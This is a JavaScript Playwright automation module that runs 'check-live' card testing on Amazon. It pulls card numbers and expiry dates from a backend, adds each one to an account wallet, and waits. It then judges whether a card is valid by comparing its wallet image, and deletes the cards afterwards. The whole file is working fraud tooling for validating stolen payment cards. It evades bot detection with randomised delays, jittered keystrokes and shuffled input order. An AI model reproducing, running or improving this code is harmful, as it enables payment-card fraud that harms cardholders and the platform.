/**
 * CheckliveOperations - Amazon Card Testing (Check-Live) Operations
 * 
 * This service handles the complete card testing workflow:
 * - Navigate to payment wallet
 * - Add multiple cards with name, number, and expiration
 * - Wait for card image to load (color validation)
 * - Validate card status using image similarity
 * - Remove all added cards
 * 
 * Workflow:
 * 1. Check signin status
 * 2. Navigate to wallet and settings
 * 3. Request cards from backend
 * 4. Add cards one by one with retry logic
 * 5. Wait for color validation time
 * 6. Check card image similarity
 * 7. Delete cards and collect results
 */

const {
  utilRandomAround,
  utilFluctuateAround,
  createPollingFactory,
  CustomError
} = require('../../../utils/toolUtils');

class CheckliveOperations {
  /**
   * @param {Object} taskPublicService - Task public service instance
   */
  constructor(taskPublicService) {
    this._tp_ = taskPublicService;
    
    // Private state
    this.defaultRollback = true;
    this.dataPmtsComponentId = '';
  }

  /**
   * Main check-live workflow
   */
  async execute() {
    // Check signin status
    if (await this.checkSignin()) {
      this._tp_.createError({ message: '账户singin', logID: 'CL-Error-Signin' });
    }
    
    // Navigate to payment management
    await this.goToHomepage();
    
    if (await this.checkAddressDismiss()) {
      await this.dismissAddress();
    }
    
    await this.goToWallet();
    await this.checkCardCounts();
    
    await this.goToSettings();
    await this.goToManageOneClick();
    
    if (!await this.checkAddressStatus()) {
      this._tp_.createError({ message: '没有地址', logID: 'CL-Error-NotAddress' });
    }
    
    await this.checkUsername();
    
    // Add cards
    await this.addCards();
    
    // Return to wallet and delete cards
    await this.returnToWallet();
    await this.deleteCards();
    
    await this.goToNavLogo();
  }

  /**
   * Navigation Operations
   */
  async goToNavLogo() {
    try {
      await this.clickElement(this._tp_.ctxPage.locator('#nav-logo-sprites'), {
        title: '桌面端，主站，首页logo',
        waitForURL: true
      });
    } catch {}
  }

  async goToHomepage() {
    this._tp_.tasklog({ message: '打开个人中心', logID: 'CL-Info-Operate' });
    return this.clickElement(
      this._tp_.ctxPage.locator('a[data-nav-role="signin"]').first(),
      {
        title: '桌面端，主站，打开个人中心',
        waitForURL: true
      }
    );
  }

  async goToWallet() {
    this._tp_.tasklog({ message: '打开支付中心', logID: 'CL-Info-Operate' });
    return this.clickElement(
      this._tp_.ctxPage.locator('a[href*="/cpe/yourpayments/wallet"]'),
      {
        title: '桌面端，主站，打开支付中心',
        waitForURL: true
      }
    );
  }

  async goToSettings() {
    this._tp_.tasklog({ message: '打开支付设置', logID: 'CL-Info-Operate' });
    return this.clickElement(
      this._tp_.ctxPage.locator('a[href*="/cpe/yourpayments/settings"]'),
      {
        title: '桌面端，主站，打开支付设置',
        waitForURL: true
      }
    );
  }

  async goToManageOneClick() {
    this._tp_.tasklog({ message: '打开付款方式一键管理', logID: 'CL-Info-Operate' });
    const manageoneBox = this._tp_.ctxPage.locator('a[href*="/cpe/manageoneclick"]');
    const count = await manageoneBox.count();
    const randomItem = Math.floor(Math.random() * count);
    
    return this.clickElement(manageoneBox.nth(randomItem), {
      title: '桌面端，主站，打开付款方式一键管理',
      waitForURL: true
    });
  }

  async returnToWallet() {
    this._tp_.tasklog({ message: '返回卡片管理', logID: 'CL-Info-Operate' });
    try {
      await this.clickElement(
        this._tp_.ctxPage.locator('a[href*="/cpe/yourpayments/wallet"]'),
        {
          title: '桌面端，主站，返回卡片管理',
          waitForURL: true
        }
      );
    } catch {
      await this._tp_.ctxPage.goto('https://www.amazon.com/cpe/yourpayments/wallet', {
        timeout: 60000
      });
    }
  }

  /**
   * Address Operations
   */
  async selectFirstAddress() {
    this._tp_.tasklog({ message: '选择首地址', logID: 'CL-Info-Operate' });
    const addressBox = this._tp_.ctxPage.locator(
      'input[name*="ppw-widgetEvent:ChangeAddressPreferredPaymentMethodEvent"]'
    );
    const count = await addressBox.count();
    const randomItem = Math.floor(Math.random() * count);
    
    return this.clickElement(addressBox.nth(randomItem), {
      title: '桌面端，主站，选择首地址',
      waitForRequest: /payments-portal\/data\/widgets2\/v1\/customer\/.+\/continueWidget$/
    });
  }

  async dismissAddress() {
    return this.clickElement(
      this._tp_.ctxPage
        .locator('.a-section.glow-toaster input[data-action-type="DISMISS"]'),
      {
        title: '桌面端，主站，不设置地址'
      }
    );
  }

  /**
   * Card Addition Operations
   */
  async addCards() {
    for (let i = 0; i < this._tp_.taskCheckliveConfig.singleCount; i++) {
      const cardInfo = await this.requestCard(
        this._tp_.taskBaseConfig.containerCode
      );
      
      if (!cardInfo) {
        this._tp_.createError({ message: '可用卡片用完', logID: 'CL-Error-NotCard' });
      }
      
      const { number, date } = cardInfo;
      const [month, year] = [date.slice(0, 2), '20' + date.slice(2)];
      
      const options = { success: false, retry: 0 };
      
      while (!options.success && options.retry < 3) {
        try {
          await this.selectFirstAddress();
          await this.openRegistrationLink();
          
          // Randomly order name and number input
          if (Math.random() < 0.5) {
            await this.fillCardName(this._tp_.taskCheckliveConfig.username);
            await this.fillCardNumber(number);
          } else {
            await this.fillCardNumber(number);
            await this.fillCardName(this._tp_.taskCheckliveConfig.username);
          }
          
          // Select month if not January
          if (month !== '01') {
            await this.selectMonth(month);
          }
          
          // Select year if not current year
          if (new Date().getFullYear().toString() !== year) {
            await this.selectYear(year);
          }
          
          await this.submitCard();
          
          this._tp_.tasklog({
            message: `${number} 添加成功`,
            cardInfo: { ...cardInfo, addTime: Date.now() },
            logID: 'CL-Card-Add-Operate'
          });
          
          this._tp_.updateCheckliveConfig(conf => {
            conf.cardRecord.push({
              ...cardInfo,
              addTime: Date.now()
            });
          });
          
          options.success = true;
        } catch (error) {
          if (
            this._tp_.taskCheckliveConfig.isSignin ||
            (error instanceof CustomError && error.logID === 'CL-Error-Signin')
          ) {
            this._tp_.createError({
              message: `账户Signin，加卡过程`,
              logID: 'CL-Error-Signin'
            });
          }
          
          if (error instanceof CustomError && error.logID === 'CL-Error-Auth') {
            throw error;
          }
          
          this._tp_.tasklog({
            message: `${number} 添加失败，重试，${error?.message}`,
            logID: 'Warn-Info'
          });
          
          await this.rollbackAddCard();
          options.retry++;
        }
      }
      
      if (!options.success) {
        this._tp_.tasklog({ logID: 'CL-Card-NotAdd', cardInfo });
        this._tp_.createError({ message: '添加卡片异常，退出', logID: 'Error-Info' });
      }
      
      await this.rollbackAddCard();
    }
  }

  async openRegistrationLink() {
    this._tp_.tasklog({ message: '准备添加卡片', logID: 'CL-Info-Operate' });
    return this.clickElement(
      this._tp_.ctxPage.locator('a.apx-secure-registration-content-trigger-js'),
      {
        title: '桌面端，主站，准备添加卡片',
        waitForFrame: /^https:\/\/apx-security\.amazon\.[^\/]+\/cpe\/pm\/register$/,
        waitUntil: 'networkidle'
      }
    );
  }

  async fillCardName(name) {
    this._tp_.tasklog({ message: '填写姓名', logID: 'CL-Info-Operate' });
    const cardForm = this._tp_.ctxPage.frameLocator(
      '.apx-inline-secure-iframe.pmts-portal-component'
    );
    
    return this.fillInput(cardForm.locator('input[name="ppw-accountHolderName"]'), name, {
      title: '桌面端，主站，填写姓名'
    });
  }

  async fillCardNumber(number) {
    this._tp_.tasklog({ message: '填写卡号', logID: 'CL-Info-Operate' });
    const cardForm = this._tp_.ctxPage.frameLocator(
      '.apx-inline-secure-iframe.pmts-portal-component'
    );
    
    return this.fillInput(
      cardForm.locator('input[name="addCreditCardNumber"]'),
      number,
      {
        title: '桌面端，主站，填写卡号',
        pauseAfter: 4
      }
    );
  }

  async selectMonth(label) {
    const cardForm = this._tp_.ctxPage.frameLocator(
      '.apx-inline-secure-iframe.pmts-portal-component'
    );
    return cardForm
      .locator('select[name="ppw-expirationDate_month"]')
      .selectOption({ label });
  }

  async selectYear(label) {
    const cardForm = this._tp_.ctxPage.frameLocator(
      '.apx-inline-secure-iframe.pmts-portal-component'
    );
    return cardForm
      .locator('select[name="ppw-expirationDate_year"]')
      .selectOption({ label });
  }

  async submitCard() {
    this._tp_.tasklog({ message: '确定删卡', logID: 'CL-Info-Operate' });
    const cardForm = this._tp_.ctxPage.frameLocator(
      '.apx-inline-secure-iframe.pmts-portal-component'
    );
    
    return this.clickElement(
      cardForm.locator('input[name="ppw-widgetEvent:AddCreditCardEvent"]'),
      {
        title: '桌面端，主站，确定删卡',
        waitForRequest: /payments-portal\/data\/widgets2\/v1\/customer\/.+\/continueWidget\?.+$/,
        checkSignin: true
      }
    );
  }

  async rollbackAddCard() {
    this._tp_.tasklog({ message: '不选择账单地址', logID: 'CL-Info-Operate' });
    const popover = this._tp_.ctxPage
      .locator('.a-popover.a-popover-modal.a-declarative')
      .last();
    
    return this.clickElement(popover.locator('.a-button-close.a-declarative'), {
      title: '桌面端，主站，不选择账单地址',
      waitForRequest: /payments-portal\/data\/widgets2\/v1\/customer\/.+\/continueWidget$/
    });
  }

  /**
   * Card Deletion Operations
   */
  async deleteCards() {
    const walletBox = this._tp_.ctxPage.locator(
      '.a-row.apx-wallet-desktop-payment-method-selectable-tab-inner-css'
    );
    
    for (let i = 0; i < this._tp_.taskCheckliveConfig.cardRecord.length; i++) {
      const elapsed = Date.now() - (this._tp_.taskCheckliveConfig.cardRecord[i].addTime || 0);
      
      // Wait for color validation time
      if (elapsed < this._tp_.taskCheckliveConfig.colorWaitTime) {
        await this._tp_.ctxPage.waitForTimeout(
          this._tp_.taskCheckliveConfig.colorWaitTime - elapsed +
          utilRandomAround(10000, 20000)
        );
      }
      
      try {
        // Select card (reverse order)
        await this.selectCard(
          walletBox
            .locator('div[data-pmts-component-id]')
            .nth(this._tp_.taskCheckliveConfig.cardRecord.length - i - 1)
        );
        
        // Validate card image
        const info = await this.validateCardImage();
        this._tp_.tasklog({ message: info.src, logID: 'CL-Info-Operate' });
        
        // Delete card
        await this.editCard();
        await this.removeCard();
        await this.confirmRemoveCard();
        
        this._tp_.updateCheckliveConfig(conf => {
          Object.assign(conf.cardRecord[i], { ...info, delTime: Date.now() });
        });
        
        this._tp_.tasklog({
          message: `${this._tp_.taskCheckliveConfig.cardRecord[i].number} 删除成功${
            info.valid ? ' ✅' : ''
          }`,
          cardInfo: this._tp_.taskCheckliveConfig.cardRecord[i],
          logID: 'CL-Card-Del-Operate'
        });
      } catch (error) {
        if (
          this._tp_.taskCheckliveConfig.isSignin ||
          (error instanceof CustomError && error.logID === 'CL-Error-Signin')
        ) {
          this._tp_.createError({
            message: '账户Signin，删卡过程',
            logID: 'CL-Error-Signin'
          });
        }
        
        this._tp_.tasklog({
          message: `${this._tp_.taskCheckliveConfig.cardRecord[i].number} 删除失败，跳过，${
            error?.message
          }`,
          logID: 'Warn-Info'
        });
        
        if (this._tp_.ctxPage.isClosed()) return;
        
        await this._tp_.ctxPage.reload({ waitUntil: 'load', timeout: 60000 });
        continue;
      }
    }
  }

  async selectCard(element) {
    this._tp_.tasklog({ message: '选择卡片', logID: 'CL-Info-Operate' });
    return this.clickElement(element, {
      title: '桌面端，主站，选择卡片',
      waitForRequest: /payments-portal\/data\/widgets2\/v1\/customer\/.+\/continueWidget$/
    });
  }

  async editCard() {
    this._tp_.tasklog({ message: '准备删除', logID: 'CL-Info-Operate' });
    return this.clickElement(
      this._tp_.ctxPage
        .locator('.a-row.apx-wallet-payment-method-details-section.pmts-portal-component')
        .first()
        .locator('.a-link-normal'),
      {
        title: '桌面端，主站，准备删除',
        waitForRequest: /payments-portal\/data\/widgets2\/v1\/customer\/.+\/continueWidget$/
      }
    );
  }

  async removeCard() {
    this._tp_.tasklog({ message: '删除卡片', logID: 'CL-Info-Operate' });
    const popover = this._tp_.ctxPage
      .locator('.a-popover.a-popover-modal.a-declarative')
      .last();
    
    return this.clickElement(
      popover.locator('input[name*="ppw-widgetEvent:StartDeleteEvent"]').first(),
      {
        title: '桌面端，主站，删除卡片',
        waitForRequest: /payments-portal\/data\/widgets2\/v1\/customer\/.+\/continueWidget\?.+$/
      }
    );
  }

  async confirmRemoveCard() {
    this._tp_.tasklog({ message: '确定删卡', logID: 'CL-Info-Operate' });
    const popover = this._tp_.ctxPage
      .locator('.a-popover.a-popover-modal.a-declarative')
      .last();
    
    return this.clickElement(
      popover.locator(
        '.a-button.a-button-primary.pmts-delete-instrument.apx-remove-button-desktop.pmts-button-input'
      ),
      {
        title: '桌面端，主站，确定删卡',
        waitForRequest: /payments-portal\/data\/widgets2\/v1\/customer\/.+\/continueWidget$/,
        checkSignin: true
      }
    );
  }

  /**
   * Card Validation Operations
   */
  async validateCardImage() {
    try {
      await this._tp_.ctxPage.waitForTimeout(1000);
      
      const box = this._tp_.ctxPage.locator(
        '.a-row.apx-wallet-payment-method-details-section.pmts-portal-component'
      );
      const componentId = await box.getAttribute('data-pmts-component-id', {
        timeout: 60000
      });
      
      if (componentId !== this.dataPmtsComponentId) {
        const element = this._tp_.ctxPage
          .locator('.apx-wallet-details-payment-method-image')
          .last();
        const src = await element.getAttribute('src');
        
        const response = await fetch(src);
        const buffer = Buffer.from(await response.arrayBuffer());
        
        // Import image similarity utility
        const { utilBufferSimilar } = require('../../../utils/imageUtils');
        const { valid, distances } = await utilBufferSimilar(
          buffer,
          this._tp_.taskBaseConfig.device
        );
        
        this.dataPmtsComponentId = componentId;
        return { src, valid, distances };
      }
      
      return { src: '', distances: [0, 0], valid: 0 };
    } catch {
      return { src: '', distances: [0, 0], valid: 0 };
    }
  }

  /**
   * Check Operations
   */
  async checkSignin() {
    try {
      const box = this._tp_.ctxPage.locator('a[data-nav-role="signin"]').first();
      const signin = await box.getAttribute('href');
      return signin.includes('/ap/signin');
    } catch {
      return false;
    }
  }

  async checkCardCounts() {
    const cardItems = this._tp_.ctxPage
      .locator('.apx-wallet-desktop-payment-method-selectable-tab-css.a-scroller-vertical')
      .locator('.apx-wallet-selectable-payment-method-tab.pmts-portal-component');
    
    try {
      await cardItems.first().waitFor({ timeout: 3000 });
      const count = await cardItems.count();
      
      this._tp_.updateCheckliveConfig(conf => {
        conf.defaultCardCount = count;
      });
    } catch {}
  }

  async checkUsername() {
    const box = this._tp_.ctxPage
      .locator('.a-box.a-color-alternate-background')
      .first()
      .locator('.a-size-medium');
    
    try {
      const name = await box.innerText({ timeout: 3000 });
      this._tp_.updateCheckliveConfig(conf => {
        conf.username = name.trim().split(',')[0];
      });
    } catch {
      this._tp_.updateCheckliveConfig(conf => {
        conf.username = 'amazon starer';
      });
    }
  }

  async checkAddressDismiss() {
    const box = this._tp_.ctxPage.locator(
      '.a-section.glow-toaster input[data-action-type="DISMISS"]'
    );
    
    try {
      await box.waitFor({ timeout: 3000 });
      return true;
    } catch {
      return false;
    }
  }

  async checkAddressStatus() {
    const box = this._tp_.ctxPage.locator('form.pmts-portal-component.a-spacing-none');
    
    try {
      await box.first().waitFor({ timeout: 3000 });
      return true;
    } catch {
      return false;
    }
  }

  /**
   * Other Site Operations (for non-US Amazon sites)
   */
  async addCardsOtherSite() {
    for (let i = 0; i < this._tp_.taskCheckliveConfig.cardRecord.length; i++) {
      this.defaultRollback = true;
      
      const { number, date } = this._tp_.taskCheckliveConfig.cardRecord[i];
      
      await this.openRegistrationLinkOther();
      
      try {
        // Shuffle input order
        const shuffledTasks = [
          () => this.fillCardNumberOther(number),
          () => this.fillCardDateOther(date),
          () => this.fillCardNameOther(this._tp_.taskCheckliveConfig.username)
        ].sort(() => Math.random() - 0.5);
        
        for (const task of shuffledTasks) {
          await task();
        }
        
        await this.submitCardOther();
        await this.rollbackAddCardOther();
      } catch (error) {
        if (this._tp_.taskCheckliveConfig.isSignin) {
          this._tp_.createError({ message: '账户Signin', logID: 'CL-Error-Signin' });
        }
        
        this.defaultRollback = false;
        this._tp_.tasklog({
          message: `${number} 添加失败，跳过，${error?.message}`,
          logID: 'Warn-Info'
        });
        
        await this.rollbackAddCardOther();
        continue;
      }
      
      this._tp_.updateCheckliveConfig(conf => {
        conf.cardRecord[i].addTime = Date.now();
        conf.addCounts++;
      });
      
      this._tp_.tasklog({
        message: `${number} 添加成功`,
        cardInfo: this._tp_.taskCheckliveConfig.cardRecord[i],
        logID: 'CL-Card-Add-Operate'
      });
    }
    
    await this.closePopoverOther();
  }

  async openRegistrationLinkOther() {
    return this.clickElement(
      this._tp_.ctxPage.locator('#apx-add-credit-card-action-test-id').locator('input.a-button-input'),
      {
        title: '桌面端，其他站，准备添加卡片',
        waitForFrame: /^https:\/\/apx-security\.amazon\.[^\/]+\/cpe\/pm\/register$/,
        waitUntil: 'networkidle'
      }
    );
  }

  async fillCardNumberOther(number) {
    const cardForm = this._tp_.ctxPage.frameLocator('.apx-secure-iframe.pmts-portal-component');
    return this.fillInput(cardForm.locator('input[name="addCreditCardNumber"]'), number, {
      title: '桌面端，其他站，填写卡号',
      pauseAfter: 4
    });
  }

  async fillCardDateOther(date) {
    const cardForm = this._tp_.ctxPage.frameLocator('.apx-secure-iframe.pmts-portal-component');
    return this.fillInput(
      cardForm.locator('input[data-testid="date-expiration-text-input"]'),
      date,
      {
        title: '桌面端，其他站，填写日期',
        pauseAfter: 2
      }
    );
  }

  async fillCardNameOther(name) {
    const cardForm = this._tp_.ctxPage.frameLocator('.apx-secure-iframe.pmts-portal-component');
    return this.fillInput(cardForm.locator('input[data-testid="input-text-input"]'), name, {
      title: '桌面端，其他站，填写姓名'
    });
  }

  async submitCardOther() {
    const cardForm = this._tp_.ctxPage.frameLocator('.apx-secure-iframe.pmts-portal-component');
    return this.clickElement(cardForm.locator('div[data-testid="button"]'), {
      title: '桌面端，其他站，确定删卡',
      waitForRequest: /payments-portal\/data\/.*?set-registration\?.+$/
    });
  }

  async rollbackAddCardOther() {
    const cardForm = this._tp_.ctxPage.frameLocator('.apx-secure-iframe.pmts-portal-component');
    return this.clickElement(cardForm.locator('div[role="button"]').first(), {
      title: '桌面端，其他站，不选择账单地址',
      ...(this.defaultRollback
        ? {
            waitForRequest: /payments-portal\/data\/widgets2\/v1\/customer\/.+\/continueWidget$/
          }
        : {})
    });
  }

  async closePopoverOther() {
    const popover = this._tp_.ctxPage
      .locator('.a-popover.a-popover-modal.a-declarative')
      .last();
    
    return this.clickElement(popover.locator('.a-button-close.a-declarative'), {
      title: '桌面端，其他站，关闭弹窗',
      waitForRequest: /payments-portal\/data\/widgets2\/v1\/customer\/.+\/continueWidget$/
    });
  }

  /**
   * Event Emitter Operations
   */
  requestCard(containerCode) {
    return new Promise(resolve => {
      const { nodeEmitter } = require('../../../utils/eventEmitter');
      nodeEmitter.once('RESPONSE_CARD', (info) => {
        resolve(info);
      });
      nodeEmitter.emit('REQUEST_CARD', containerCode);
    });
  }

  /**
   * Helper Methods
   */
  async clickElement(element, options) {
    const oldUrl = this._tp_.ctxPage.url();
    const timestamp = Date.now();
    
    await this._tp_.ctxPage.waitForTimeout(utilRandomAround(2000, 3000));
    
    try {
      await element.click({ delay: utilRandomAround(150) });
      
      if (options.waitForURL) {
        try {
          await this._tp_.ctxPage.waitForURL(
            u => u.href !== oldUrl,
            {
              timeout: 120000,
              waitUntil: options.waitUntil || 'load'
            }
          );
        } catch {
          this._tp_.createError({ message: `URL跳转失败`, logID: 'Error-Info' });
        }
      }
      
      if (options.waitForRequest) {
        const response = await this._tp_.ctxPage.waitForResponse(
          options.waitForRequest,
          { timeout: 60000 }
        );
        
        if (response.request().timing().startTime > timestamp && response.status() === 401) {
          if (options.checkSignin) {
            this._tp_.createError({ message: '账户Signin', logID: 'CL-Error-Signin' });
          } else {
            this._tp_.createError({
              message: `需要重新登录授权`,
              logID: 'CL-Error-Auth'
            });
          }
        }
      }
      
      if (options.waitForFrame) {
        const waitFrame = await this._tp_.ctxPage.waitForEvent('framenavigated', predicate => {
          return options.waitForFrame.test(predicate.url());
        });
        await waitFrame.waitForLoadState(options.waitUntil || 'load', { timeout: 60000 });
      }
    } catch (error) {
      if (error instanceof CustomError) throw error;
      this._tp_.createError({
        message: `${options.title} 操作失败`,
        logID: 'Error-Info'
      });
    }
  }

  async fillInput(element, str, options) {
    try {
      for (let retry = 1; retry <= 2; retry++) {
        await element.click({ delay: utilFluctuateAround(150) });
        await this._tp_.ctxPage.waitForTimeout(utilRandomAround(1000, 1500));
        
        if (retry > 1) {
          await element.press('ControlOrMeta+A', { delay: utilFluctuateAround(120) });
          await this._tp_.ctxPage.waitForTimeout(utilRandomAround(250, 500));
          await element.press('Backspace', { delay: utilFluctuateAround(120) });
          await this._tp_.ctxPage.waitForTimeout(utilRandomAround(250, 500));
        }
        
        const chars = str.padStart(4, '0').split('');
        
        for (let i = 0; i < chars.length; i++) {
          await element.press(chars[i], { delay: utilFluctuateAround(120) });
          
          if (
            options.pauseAfter &&
            (i + 1) % options.pauseAfter === 0 &&
            i !== chars.length - 1
          ) {
            await this._tp_.ctxPage.waitForTimeout(utilFluctuateAround(120) * 2);
          }
        }
        
        const rawValue = await element.inputValue();
        const cleanedValue = rawValue.replace(/[\s/]/g, '');
        const finalValue = /^\d+$/.test(cleanedValue) ? cleanedValue : rawValue;
        
        if (finalValue == str) {
          await this._tp_.ctxPage.waitForTimeout(utilRandomAround(2000, 3000));
          return;
        }
      }
    } catch (error) {
      if (error instanceof CustomError) throw error;
      this._tp_.createError({
        message: `${options.title} 操作失败`,
        logID: 'Error-Info'
      });
    }
  }
}

module.exports = { CheckliveOperations };
